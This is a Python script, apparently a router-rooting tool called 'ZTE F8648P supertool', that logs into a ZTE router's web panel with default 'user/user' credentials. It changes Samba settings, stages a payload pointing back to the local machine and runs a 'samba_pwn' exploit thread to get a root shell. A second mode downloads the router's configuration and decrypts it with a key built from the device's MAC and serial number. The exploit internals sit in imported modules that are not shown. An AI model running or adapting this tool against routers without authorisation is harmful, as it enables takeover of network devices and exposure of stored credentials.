#!/usr/bin/env python3

import re
import requests
import json
import base64
from hashlib import sha256
from pages import login, lanstatus, samba_get, samba_post, ping_get, ping_post, traceroute_get, traceroute_post, download_get, download_post, macforkey_get,serialforkey_get
from functions import encodepass, composekey, getlanip, prepare_payload, prepare_testsmb, getshell, nousb_run
from configdecryptor import configdec
from samba import samba_pwn
from time import sleep
import threading
from colorama import Fore
from colorama import Style
from colorama import init
import sys
import os

init()

user = "user"
password = "user"
host = "192.168.1.1"

nousb = False
try:
    if sys.argv[1] == "--nousb":
        nousb = True
except:
    pass

print(Fore.YELLOW + "ZTE F8648P supertool by alezz!" + Style.RESET_ALL)

if nousb == True:
    print("[nousb]: Running in --nousb mode")
    if os.getuid != 0 and os.geteuid() != 0:
        print("[nousb]: You need to be root for this mode to work! Stopping")
        exit(0)     
    

print("What is the router IP? [default: {}]".format(host))
routerip = str(input())
if routerip != '':
    host = routerip
print("What do you want to do? [1=root shell,2=config decript]")
cmd = 0
while cmd != 1 and cmd != 2:
    cmd = int(input())

if cmd == 1:
    print("What is the user password? [default: {}]".format(password))
    userpass = str(input())
    if userpass != '':
        password = userpass
    r = requests.Session()
    login(r,host,user,password)
    post_token = samba_get(r,host)
    if nousb == True:
        samba_post(r,host,post_token,"0","test","test")
        samba_post(r,host,post_token,"1","test","test")
        nousb_run(host)
    samba_post(r,host,post_token,"0","test","test")
    samba_post(r,host,post_token,"1","test","test")
    localip = getlanip()
    prepare_payload(localip,nousb)
    prepare_testsmb(nousb)
    sambathread = threading.Thread(target=samba_pwn,args=[host,nousb])
    sambathread.start()
    getshell()
    

if cmd == 2:
    print("Note: You need the admin password for this step. If this is your first time using this tool you probably need to do root shell first to change the admin password.")
    print("What is the admin password?")
    adminpass = str(input())
    r = requests.Session()
    login(r,host,"admin",adminpass)
    post_token = download_get(r,host)
    download_post(r,host,post_token)
    mac = macforkey_get(r,host)
    serial = serialforkey_get(r,host)
    key = composekey(mac,serial)
    configdec(key)

